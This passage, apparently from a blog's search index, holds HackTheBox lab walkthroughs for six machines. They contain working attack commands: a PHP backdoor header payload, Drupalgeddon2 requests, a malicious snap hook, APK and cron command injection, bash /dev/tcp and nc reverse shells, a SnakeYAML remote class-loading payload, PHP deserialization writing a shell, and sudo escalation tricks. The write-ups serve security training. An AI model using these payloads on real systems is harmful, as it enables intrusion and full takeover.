&#39;DB_PASSWORD&#39;, &#39;development01&#39; );Found a conf file autologin.conf.orig in /opt directory which reads password from multiple folders. From /etc/autologin get new password which worked for user “katie” in ssh login.User “katie” have sudo rights to run /sbin/initctl as any user on the box with NOPASSWD and SETENV enable.katie@spectra ~ $ sudo -lUser katie may run the following commands on spectra: (ALL) SETENV: NOPASSWD: /sbin/initctlinitctl with sudo initctl man page, initctl allows a system administrator to communicate and interact with the Upstart init(8) daemon. Upstart: software is an event-based replacement for the traditional init daemon—the method by which several Unix-like computer operating systems perform tasks when the computer is started. upstart doc upstart scripts: An Upstart script is a combination of states and events. Upstart scripts are located in /etc/init/ directory with a .conf extension. The scripts are called “System Jobs” and run using sudo privileges. Just like system jobs we also have “User Jobs” that are located at $HOME/.init/ directory. (Note: Only Ubuntu versions above 11.10 support user jobs). After internal upstart initialization, it emits an event called ‘startup’ which triggers rest of system and user jobs. writing upstart jobs official doc, blog User katie is in “developers” groupkatie@spectra /etc/init $ iduid=20156(katie) gid=20157(katie) groups=20157(katie),20158(developers)and there are some job scripts in /etc/init folder which writable by “developers” group users.stop “test” job#to check if job is runningsudo -u root /sbin/initctl listsudo -u root /sbin/initctl stop testCreating upstart job scriptcat &amp;gt; /etc/init/test.conf &amp;lt;&amp;lt; EOFdescription &quot;initctl privesc&quot;start on filesystem or runlevel [2345]stop on shutdownscript chmod +s /bin/bashend scriptpost-stop script # clean up echo &#39;&#39; &amp;gt; /etc/init/test.confend scriptEOFrestart jobsudo -u root /sbin/initctl start test" }, { "title": "Hackthebox - Knife", "url": "/posts/knife/", "categories": "hackthebox, linux", "tags": "php 8.1.0-dev, sudo knife", "date": "2021-05-22 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.10.242 knife.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)| 256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)|_ 256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Emergent Medical IdeaService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelRunning PHP version is❯ curl -I http://knife.htb/HTTP/1.1 200 OKDate: Sun, 23 May 2021 02:42:36 GMTServer: Apache/2.4.41 (Ubuntu)X-Powered-By: PHP/8.1.0-devContent-Type: text/html; charset=UTF-8This is looks like a backdoor php which happened after php-rce github repo is compromised and someone made a commit with backdoorThis backdoor executes PHP code from within the useragent HTTP header User-Agentt, if the string starts with ‘zerodium’zerodium$any_php_function();Footholdbackdoor php VersionExploit it by sending payload in User-Agentt header❯ curl -s http://knife.htb/ -H &quot;User-Agentt: zerodiumsystem(&#39;id&#39;);&quot; | sed &#39;/&amp;lt;!DOCTYPE html&amp;gt;/,/&amp;lt;\\/html&amp;gt;/d&#39;uid=1000(james) gid=1000(james) groups=1000(james)Privescknife Command with sudoUser “james” have sudo rights to run /usr/bin/knife as root with NOPASSWD(remote) james@knife:/opt/opscode$ sudo -lMatching Defaults entries for james on knife: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser james may run the following commands on knife: (root) NOPASSWD: /usr/bin/knifeknife: knife is a command-line tool that provides an interface between a local chef-repo and the Chef Infra Server. The knife command line tool must be configured to communicate with the Chef Infra Server as well as any other infrastructure within your organization. Chef Infra is a configuration management tool for defining infrastructure as code (IAC), making the process of managing configurations and system state automated and testable.There is command in knife [knife exec](https://docs.chef.io/workstation/knife_exec/) which execute Ruby scripts in the context of a fully configured Chef Infra Client.Create rubby scriptsystem(&#39;/bin/bash&#39;)Runsudo -u root /usr/bin/knife exec script.rb" }, { "title": "Hackthebox - Armageddon", "url": "/posts/armageddon/", "categories": "hackthebox, linux", "tags": "drupal, cve-2018-7600, drupalgeddon 2, sudo snap install", "date": "2021-05-21 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.10.233 armageddon.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.4 (protocol 2.0)| ssh-hostkey: | 2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)| 256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)|_ 256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)80/tcp open http Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)|_http-generator: Drupal 7 (http://drupal.org)| http-robots.txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt | /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt |_/LICENSE.txt /MAINTAINERS.txt|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16|_http-title: Welcome to Armageddon | Armageddon nmap found robots.txt file on the server.Identify CMS wappalyzer identify cms is drupal 7 Running droopescan found the drupal version searching for exploit in searchsploit found RCEFootholdDrupal property injection: Drupalgeddon 2 CVE-2018-7600/SA-CORE-2018-002 A remote code execution vulnerability exists within multiple subsystems of Drupal 7.x and 8.x. This potentially allows attackers to exploit multiple attack vectors on a Drupal site, which could result in the site being completely compromised. gotmilk gist of diffrent drupal drupalgeddon2 PoCsid=$(curl -k -s &#39;http://armageddon.htb/?q=user/password&amp;amp;name\\[%23post_render\\]\\[\\]=passthru&amp;amp;name\\[%23type\\]=markup&amp;amp;name\\[%23markup\\]=id&#39; \\ --data &quot;form_id=user_pass&amp;amp;_triggering_element_name=name&quot; | grep form_build_id | cut -d&#39;&quot;&#39; -f6) &amp;amp;&amp;amp; echo $idcurl -s &quot;http://armageddon.htb/?q=file/ajax/name/%23value/$id&quot; \\ --data &quot;form_build_id=$id&quot; | head -n -1Exploit Script Drupalgeddon2 Exploit script from dreadlocked@githubGot a restricted shell on the box.Execute mysql in non interactive shellshell is almost completely disconnected and restricted from file system. nothing to do here.back to web server, found a file /update.php that tells access dinied and refer to settings.php Drupal cms sites all config settings available in the ../sites/&amp;lt;site-name&amp;gt;/settings.phpFound mysql database password in settings.php filecreds are working but don’t have interactive shellUsing mysql commandline flags to execute database command-e, --execute=name Execute command and quit.-D, --database=name Database to use.and found admin password hash who is also the user in the boxmysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e &#39;SELECT * FROM users;&#39;admin user hash cracked with johnbrucetherealadmin:$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURtsuccessfully login to ssh with admin credsPrivescsnap install with sudoin the box user “brucetherealadmin” have sudo right to run /usr/bin/snap as root with NOPASSWD.[brucetherealadmin@armageddon ~]$ sudo -lMatching Defaults entries for brucetherealadmin on armageddon: !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&quot;, env_keep+=&quot;MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&quot;, env_keep+=&quot;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&quot;, env_keep+=&quot;LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&quot;, env_keep+=&quot;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot;, secure_path=/sbin\\:/bin\\:/usr/sbin\\:/usr/binUser brucetherealadmin may run the following commands on armageddon: (root) NOPASSWD: /usr/bin/snap install *Found Exploit on gtfobinsCreate snap package Generate password hash with command openssl passwd &quot;Password&quot; COMMAND=&#39;echo &quot;toor:VmIEBMKbM9avc:0:0:root/root:/bin/bash&quot; &amp;gt;&amp;gt; /etc/passwd&#39;cd $(mktemp -d)mkdir -p meta/hooksprintf &#39;#!/bin/sh\\n%s; false&#39; &quot;$COMMAND&quot; &amp;gt;meta/hooks/installchmod +x meta/hooks/installfpm -n xxxx -s dir -t snap -a all meta If fpm is not installsudo gem install --no-document fpmsudo apt-get install squashfs-toolsupload package with scpsshpass -p &#39;booboo&#39; scp ./xxxx_1.0_all.snap brucetherealadmin@armageddon.htb:/home/brucetherealadmin/snapAnd finally runsudo -u root /usr/bin/snap install * --dangerous --devmode" }, { "title": "Hackthebox - ScriptKiddie", "url": "/posts/scriptKiddie/", "categories": "hackthebox, linux", "tags": "metasploit, cve-2020-7384, msfconsole", "date": "2021-05-20 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.10.226 scriptKiddie.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)| 256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)|_ 256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)5000/tcp open http Werkzeug httpd 0.16.1 (Python 3.8.5)|_http-server-header: Werkzeug/0.16.1 Python/3.8.5|_http-title: k1d&#39;5 h4ck3r t00l5Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelPort 5000 running Werkzeug httpd 0.16.1 (Python 3.8.5) There is no command injection or lfi. searchsploit and nmap don’t have any known vulnerability. msfvenom have a template option which is vulnerable. Description: This module exploits a command injection vulnerability in Metasploit Framework’s msfvenom payload generator when using a crafted APK file as an Android payload template. Affects Metasploit Framework &amp;lt;= 6.0.11 and Metasploit Pro &amp;lt;= 4.18.0. The file produced by this module is a relatively empty yet valid-enough APK file. To trigger the vulnerability, the victim user should do the following: msfvenom -p android/&amp;lt;...&amp;gt; -x CVE-2020-7384 Rapid7 msf module: exploit/unix/fileformat/metasploit_msfvenom_apk_template_cmd_injection Exploit script FootholdCommand InjectionThe command vulnerability is in step 2 of this process from apk.rb#L194-L197. keytool is executed using the following command line: run_cmd(&quot;keytool -genkey -v -keystore #{keystore} \\ -alias #{keyalias} -storepass #{storepass} -keypass #{keypass} -keyalg RSA \\ -keysize 2048 -startdate &#39;#{orig_cert_startdate}&#39; \\ -validity #{orig_cert_validity} -dname &#39;#{orig_cert_dname}&#39;&quot;)In particular, the value for orig_cert_dname is obtained from step 1 of the process, where the original APK was parsed and the “Owner” field was extracted from the APK’s signature.This command string is passed to Open3.popen3() in apk.rb#L29-L36. When this function receives a single string parameter (as opposed to multiple parameters) it effectively acts as a system() function. def run_cmd(cmd) begin stdin, stdout, stderr = Open3.popen3(cmd) return stdout.read + stderr.read rescue Errno::ENOENT return nil end endThis gives rise to a command injection vulnerability. If a crafted APK file has a signature with an “Owner” field containing:#A single quote (to escape the single-quoted string)#Followed by shell metacharacters#and run_cmd() function see it like that-dname &#39;#{CN=&#39;|echo cGluZyAtYyAyIDEwLjEwLjE1Ljcx | base64 -d | sh #}&#39;When that APK file is used as an msfvenom template, arbitrary commands can be executed on the msfvenom user’s system. Detailed advisories commit changesExploitThis is a command injection vulnerability. When user supply a template apk to msfvenom , it takes application read it’s certificate and use cert’s owner for resign apk but don’t check for strings certificate. Create empty apk file touch empty &amp;amp;&amp;amp; zip -j payload.apk empty Create cert and add injection payload in -dname field keytool -genkey -keystore ./signing.keystore -alias &quot;signing.key&quot; -storepass &quot;password&quot; -keypass &quot;password&quot; -keyalg RSA -keysize 2048 -dname &quot;CN=&#39;|echo L2Jpbi9iYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE1LjcxLzQxNDEgMD4mMScK | base64 -d | sh #&quot; sign the apk with created cert jarsigner -sigalg SHA1withRSA -digestalg SHA1 -keystore ./signing.keystore -storepass &quot;password&quot; -keypass &quot;password&quot; payload.apk &quot;signing.key&quot; and this apk execute arbitrary code in the server and give reverse shellPrivesc Get shell as user “kid” user “pwn” have a bash script that taking content from user “kid” home folder. This can lead to command injection. Script execute by pwn cron when /home/kid/logs/hackers file get some data. using some extra words before payload to bypass cut command cut -d&#39; &#39; -f3- null null ;id|nc 10.10.15.71 4141 # pspy outputreverse shellnull null ;/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.15.71/4141 0&amp;gt;&amp;amp;1&#39; #msfconsole with sudoUser have right to run /opt/metasploit-framework-6.0.9/msfconsole with sudo as root with no passwordpwn@scriptkiddie:~$ sudo -lsudo -lMatching Defaults entries for pwn on scriptkiddie: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser pwn may run the following commands on scriptkiddie: (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsoleand inside msfconsole user “pwn” is rootsudo -u root /opt/metasploit-framework-6.0.9/msfconsole" }, { "title": "Hackthebox - Ophiuchi", "url": "/posts/ophiuchi/", "categories": "hackthebox, linux", "tags": "snakeyaml, wasm reversing", "date": "2021-02-13 18:30:00 +0000", "snippet": " EnumerationIP-ADDR: 10.10.10.227 ophiuchi.htbnmap scan:PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 6d:fc:68:e2:da:5e:80:df:bc:d0:45:f5:29:db:04:ee (RSA)| 256 7a:c9:83:7e:13:cb:c3:f9:59:1e:53:21:ab:19:76:ab (ECDSA)|_ 256 17:6b:c3:a8:fc:5d:36:08:a1:40:89:d2:f4:0a:c6:46 (ED25519)8080/tcp open http Apache Tomcat 9.0.38|_http-title: Parse YAMLService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelRunning Apache Tomcat 9.0.38 serverGobuster scan:gobuster dir -u http://ophiuchi.htb:8080/ -w ~/git-tools/SecLists/Discovery/Web-Content/raft-small-directories-lowercase.txt... [snip] .../test (Status: 302) [Size: 0] [--&amp;gt; /test/]/manager (Status: 302) [Size: 0] [--&amp;gt; /manager/]/yaml (Status: 302) [Size: 0] [--&amp;gt; /yaml/]input any data give a security errorFootholdSnakeYAML DeserilizationyamlYAML is a human-readable data-serialization language.In ymal tags are the way of telling the YAML parser which data type the following value is going to be in. From yaml refcardnone # Unspecified tag (automatically resolved by application).! # Non-specific tag (by default, &quot;!!map&quot;/&quot;!!seq&quot;/&quot;!!str&quot;).!foo # Primary (by convention, means a local &quot;!foo&quot; tag).!!foo # Secondary (by convention, means &quot;tag:yaml.org,2002:foo&quot;).!h!foo # Requires &quot;%TAG !h! &amp;lt;prefix&amp;gt;&quot; (and then means &quot;&amp;lt;prefix&amp;gt;foo&quot;).!&amp;lt;foo&amp;gt; # Verbatim tag (always means &quot;foo&quot;).these tags are use to specify the data in one of the “standard” formats like a string or an array with ! and specific class object !!. this is what i understandBack to web application, if user parse invalid tag !foo, rather than giving security error it gives Internal Server error which verifies the yaml library.SnakeYAMLSnakeYAML is a YAML-parsing JAVA library with a high-level API for serialization and deserialization of YAML documents. The entry point for SnakeYAML is the Yaml class, similar to how the ObjectMapper class is the entry point in Jackson.SnakeYAML Marshaling Vulnerability SnakeYaml Deserilization exploit blogsnakeYAML is a marshaling library in JAVA.There is a slight diffrence between Marshaling and serialization Marshaling and serialization are loosely synonymous in the context of remote procedure call, but semantically different as a matter of intent. In particular, marshaling is about getting parameters from here to there, while serialization is about copying structured data to or from a primitive form such as a byte stream.Here is the full paper of java Unmarshaller exploit marshalsec.pdfSnakeYAML only allows using public constructors and public properties. It does not require corresponding gettermethods.It has a special feature which allows calling arbitrary constructors with attacker-supplied data. This makes exploiting ScriptEngine possibleFrom the Oracle/OpenJDK standard library. Requires the ability to call arbitrary constructors with provided data. Involved types do not implement java.io.Serializable. Construct a java.net.URLobject pointing to a remote class path. Construct a java.net.URLClassLoader with that URL. Construct a javax.script.ScriptEngineManager with that ClassLoader. The constructor call invokes the ServiceLoader mechanism for javax.script.ScriptEngine Factory on the remote class path, ultimately instantiating an arbitrary remote class implementing that interface.!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [&quot;http://10.10.15.71:8000/&quot;] ]]]java ScriptEngineManager java runtime executable tool ScriptEngine interface ScriptEngineManager payloadReverse Shell❯ rev_shell=&quot;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.15.71/4141 0&amp;gt;&amp;amp;1&#39;&quot;jre=&quot;bash -c {echo,$(echo -n $rev_shell | base64)}|{base64,-d}|{bash,-i}&quot;echo $jrebash -c {echo,YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS43MS80MTQxIDA+JjEn}|{base64,-d}|{bash,-i}setup❯ tree.├── Exploit.class├── Exploit.java└── META-INF └── services └── javax.script.ScriptEngineFactoryjavax.script.ScriptEngineFactory invokes Exploit.class compiled from Exploit.java which use ScriptEngine interface methods to execute arbitrary commands.before compiling Exploit.java put reverse shell in the Exploit function and than compilejavac Exploit.javaand javax.script.ScriptEngineFactory contains compiled class path.❯ cat META-INF/services/javax.script.ScriptEngineFactoryExploitStart web server and execute SnakeYAML Marshaling payloadcurl -s -X POST \\ --data-binary $&#39;data=%21%21javax.script.ScriptEngineManager+%5B%0D%0A++%21%21java.net.URLClassLoader+%5B%5B%0D%0A++++%21%21java.net.URL+%5B%22http%3A%2F%2F10.10.15.71%3A8000%2F%22%5D%0D%0A++%5D%5D%0D%0A%5D&#39; \\ $&#39;http://10.10.10.227:8080/Servlet&#39;Privesc Tomcat manage creds store in conf/tomcat-users.xml and in this box (remote) tomcat@ophiuchi:/$ find / -type f -name tomcat-users.xml 2&amp;gt;/dev/null/opt/tomcat/conf/tomcat-users.xml get user “admin” password.su to user “admin” and found that user have sudo right to run /opt/wasm-functions/index.go script as any user on the box with NOPASSWD.(remote) tomcat@ophiuchi:/$ su adminPassword: admin@ophiuchi:/$ sudo -lMatching Defaults entries for admin on ophiuchi: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser admin may run the following commands on ophiuchi: (ALL) NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.gowasmer-go is A complete and mature WebAssembly runtime for Go.Reviewing index.go First thing notice is that script interacting with two external file but not using these file absolute path.rather than binaries if script not use absolute path when invoke any file from specific directory it is error out and not use env variables to find the file.If user execute index.go from outside /opt/wasm-functions directory it error-out.this can be exploited by coping main.wasm in other directory and create deploy.sh with reverse shellcp /opt/wasm-functions/main.wasm .echo -e &#39;#!/bin/bash\\n\\nid&#39; &amp;gt; deploy.shsudo -u root /usr/bin/go run /opt/wasm-functions/index.goexecuted successfully but there is something else that stopping script from executing deploy.sh.Checking main functionfunc main() { // Reads the WebAssembly module as bytes. bytes, _ := wasm.ReadBytes(&quot;main.wasm&quot;) // Instantiates the WebAssembly module. instance, _ := wasm.NewInstance(bytes) defer instance.Close() // Gets the `info` exported function from the WebAssembly instance. init := instance.Exports[&quot;info&quot;] // Calls that exported function. result,_ := init() //store result value as string in variable &quot;f&quot; f := result.String() if (f != &quot;1&quot;) { fmt.Println(&quot;Not ready to deploy&quot;) } else { fmt.Println(&quot;Ready to deploy&quot;) out, err := exec.Command(&quot;/bin/sh&quot;, &quot;deploy.sh&quot;).Output() if err != nil { log.Fatal(err) } fmt.Println(string(out)) }}That means that function “info” in main.wasm binary have some value that is not 1 thats why script exit with “Not ready to deploy”.wasm reversingThere is a tool wabt on github which can help to reverse main.wasm binary so we can read main.wasm source code.in wabt suite there is tool wasm2wat which translate from the binary format back to the text format.wasm2wat main.wasm -o main.watand can see that info function have constant value 0 and script checking if value if 1.modify reversed main.wasm and change info function value to 1 and use wat2wasm which translate from WebAssembly text format to the WebAssembly binary format to recompile it.wat2wasm main.wat -o main.wasmand now run again with modified main.wasm.and executed successfully" }, { "title": "Hackthebox - Tenet", "url": "/posts/tenet/", "categories": "hackthebox, linux", "tags": "source code review, php object injection, inotify", "date": "2021-01-16 18:30:00 +0000", "snippet": " ScanningRustscan/nmaprustscan -a 10.10.10.223 -r 1-65535 -- -A -sC -sV -oN - &amp;gt; tenet.nmap❯ cat tenet.nmap.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| || .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ |`-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39;The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy :: https://github.com/RustScan/RustScan : --------------------------------------[~] The config file is expected to be at &quot;/home/rustscan/.rustscan.toml&quot;[~] File limit higher than batch size. Can increase speed by increasing batch size &#39;-b 1048476&#39;.Open 10.10.10.223:22Open 10.10.10.223:80[~] Starting Script(s)[&amp;gt;] Script to be run Some(&quot;nmap -vvv -p &quot;)[~] # Nmap 7.80 scan initiated Sun Jan 17 07:22:47 2021 as: nmap -vvv -p 22,80 -A -sC -sV -oN - 10.10.10.223Nmap scan report for 10.10.10.223Host is up, received conn-refused (0.55s latency).Scanned at 2021-01-17 07:22:47 UTC for 43sPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 cc:ca:43:d4:4c:e7:4e:bf:26:f4:27:ea:b8:75:a8:f8 (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA4SymrtoAxhSnm6gIUPFcp1VhjoVue64X4LIvoYolM5BQPblUj2aezdd9aRI227jVzfkOD4Kg3OW2yT5uxFljn7q/Mh5/muGvUNA+nNO6pCC0tZPoPEwMT+QvR3XyQXxbP6povh4GISBySLw/DFQoG3A2t80Giyq5Q7P+1LH1f/m63DyiNXOPS8fNBPz59BDEgC9jJ5Lu2DTu8ko1xE/85MLYyBKRSFHEkqagRXIYUwVQASHgo3OoJ+VAcBTJZH1TmXDc4c6W0hIPpQW5dyvj3tdjKjlIkw6dH2at9NL3gnTP5xnsoiOu0dyofm2L5fvBpzvOzUnQ2rps2wANTZwZ| 256 85:f3:ac:ba:1a:6a:03:59:e2:7e:86:47:e7:3e:3c:00 (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLMM1BQpjspHo9teJwTFZntx+nxj8D51/Nu0nI3atUpyPg/bXlNYi26boH8zYTrC6fWepgaG2GZigAqxN4yuwgo=| 256 e7:e9:9a:dd:c3:4a:2f:7a:e1:e0:5d:a2:b0:ca:44:a8 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMQeNqzXOE6aVR3ulHIyB8EGf1ZaUSCNuou5+cgmNXvt80/tcp open http syn-ack Apache httpd 2.4.29 ((Ubuntu))| http-methods: |_ Supported Methods: GET POST OPTIONS HEAD|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Apache2 Ubuntu Default Page: It worksService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Only 2 ports are available one is ssh and second is apache web_server. port 80 has default apache web page.Gobustergobuster dir -u 10.10.10.223 -w ~/git-tools/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -x php,txt -o tenet.out -t 100/users.txt (Status: 200) [Size: 7]/wordpress (Status: 301) [Size: 316] [--&amp;gt; http://10.10.10.223/wordpress/] Running gobuster found wordpress and user.txt but user.txt file only shows Success ❯ curl 10.10.10.223/users.txtSuccess move on to wordpress, I ran wpscan on wordpress but there is nothing interesting in the wpsacn result and the wordpress version is 5.6 UP-TO-DATE. Foothold:php_object-injection after a while i found a comment http://tenet.htb/index.php/2020/12/16/logs/#comment-2 did you remove the sator php file and the backup?? the migration program is incomplete! why would you do this?! comment is talking about some php file sator.php and its backup normally file backups in linux stores with .bak extension. after a while i found the file i do some crazy terminal tricks and create a one liner to generate a list of possible locations on the server, but hey, i’m learning so that’s good for practice. ffuf -u http://10.10.10.223/wordpress/FUZZ -w ~/git-tools/SecLists/Discovery/Web-Content/URLs/urls-wordpress-3.3.1.txt:FUZZ -s | rev | cut -d/ -f2- | rev | sort | uniq | sed &#39;s/^/wordpress/; s/$/\\/sator.php/&#39; | sed &#39;1 i\\sator.php&#39; &amp;gt; find_sator.txt &amp;amp;&amp;amp; gobuster dir -u http://10.10.10.223/ -w find_sator.txt -x bak &amp;amp;&amp;amp; rm find_sator.txt ===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.10.223/[+] Method: GET[+] Threads: 10[+] Wordlist: find_sator.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: bak[+] Timeout: 10s===============================================================2021/01/17 17:02:49 Starting gobuster in directory enumeration mode===============================================================/sator.php (Status: 200) [Size: 63]/sator.php.bak (Status: 200) [Size: 514]===============================================================2021/01/17 17:02:53 Finished=============================================================== ok, So i found the sator.php location and the backup file. curl http://10.10.10.223/sator.php and there is nothing - ❯ curl http://10.10.10.223/sator.php[+] Grabbing users from text file &amp;lt;br&amp;gt;[] Database updated &amp;lt;br&amp;gt; review backup file to understand what sator.php file doing in the background -&amp;lt;?phpclass DatabaseExport{ public $user_file = &#39;users.txt&#39;; public $data = &#39;&#39;; public function update_db() { echo &#39;[+] Grabbing users from text file &amp;lt;br&amp;gt;&#39;; $this-&amp;gt; data = &#39;Success&#39;; } public function __destruct() { file_put_contents(__DIR__ . &#39;/&#39; . $this -&amp;gt;user_file, $this-&amp;gt;data); echo &#39;[] Database updated &amp;lt;br&amp;gt;&#39;; // echo &#39;Gotta get this working properly...&#39;; }}$input = $_GET[&#39;arepo&#39;] ?? &#39;&#39;;$databaseupdate = unserialize($input);$app = new DatabaseExport;$app -&amp;gt; update_db();?&amp;gt;if we serialize DatabaseExport class as a new DatabaseExport object -&amp;lt;?phpclass DatabaseExport{ public $user_file = &#39;poorduck.php&#39;; public $data = &#39;&amp;lt;?php exec(&quot;/bin/bash -c \\&#39;bash -i &amp;gt; /dev/tcp/&amp;lt;tun0-IP&amp;gt;/4141 0&amp;gt;&amp;amp;1\\&#39;&quot;); ?&amp;gt;&#39;;}serialize(new DatabaseExport)?&amp;gt;O:14:&quot;DatabaseExport&quot;:2:{s:9:&quot;user_file&quot;;s:8:&quot;hush.php&quot;;s:4:&quot;data&quot;;s:33:&quot;&amp;lt;?php exec(&quot;/bin/bash -c \\&#39;bash -i &amp;gt; /dev/tcp/&amp;lt;tun0-IP&amp;gt;/4141 0&amp;gt;&amp;amp;1\\&#39;&quot;); ?&amp;gt;&quot;;}unserialize data:__PHP_Incomplete_Class Object( [__PHP_Incomplete_Class_Name] =&amp;gt; DatabaseExport [user_file] =&amp;gt; hush.php [data] =&amp;gt; &amp;lt;?php exec(&quot;/bin/bash -c \\&#39;bash -i &amp;gt; /dev/tcp/&amp;lt;tun0-IP&amp;gt;/4141 0&amp;gt;&amp;amp;1\\&#39;&quot;); ?&amp;gt;)so when this unserialize data run in the script it creats new DatabaseExport object from that class and now the script run with two DatabaseExport objects and with the user.txt file our shell.php also created.so on behalf of the DatabaseExport class two new DatabaseExport objects created -First:$databaseupdate = unserialize($input); -&amp;gt; new DatabaseExport;Second:$app = new DatabaseExport;$app -&amp;gt; update_db();where $databaseupdate containsclass DatabaseExport{ public $user_file = &#39;shell.php&#39;; public $data = &#39;&amp;lt;?php echo system($_GET[&quot;x&quot;]); ?&amp;gt;&#39;; public function __destruct() { file_put_contents(__DIR__ . &#39;/&#39; . $this -&amp;gt;user_file ==&amp;gt; &#39;shell.php&#39;, $this-&amp;gt;data ==&amp;gt; &#39;&amp;lt;?php exec(&quot;/bin/bash -c \\&#39;bash -i &amp;gt; /dev/tcp/&amp;lt;tun0-IP&amp;gt;/4141 0&amp;gt;&amp;amp;1\\&#39;&quot;); ?&amp;gt;&#39;); echo &#39;[] Database updated &amp;lt;br&amp;gt;&#39;; // echo &#39;Gotta get this working properly...&#39;; }}and $app containsclass DatabaseExport{ public $user_file = &#39;users.txt&#39;; public $data = &#39;&#39;; public function update_db() { echo &#39;[+] Grabbing users from text file &amp;lt;br&amp;gt;&#39;; $this-&amp;gt; data = &#39;Success&#39;; } public function __destruct() { file_put_contents(__DIR__ . &#39;/&#39; . $this -&amp;gt;user_file ==&amp;gt; &#39;users.txt&#39;, $this-&amp;gt;data ==&amp;gt; &#39;&#39;); echo &#39;[] Database updated &amp;lt;br&amp;gt;&#39;; // echo &#39;Gotta get this working properly...&#39;; }}and update_db() function is exec in this object because $app is calling it with $app -&amp;gt; update_db();and __destruct() is the magic method and “The destructor method will be called as soon as there are no other references to a particular object.”Reference: ExploitDB documentation on deserialization-vulnerability ippsec Video on PHP Deserialization PayloadsAllTheThings medium article phpgcc tool ambionics@githubUser Exploitand here is the final automate script for exploiting this vulnerability -&amp;lt;?phpclass DatabaseExport{ public $user_file = &#39;poorduck.php&#39;; public $data = &#39;&amp;lt;?php exec(&quot;/bin/bash -c \\&#39;bash -i &amp;gt; /dev/tcp/&amp;lt;tun0-IP&amp;gt;/4141 0&amp;gt;&amp;amp;1\\&#39;&quot;); 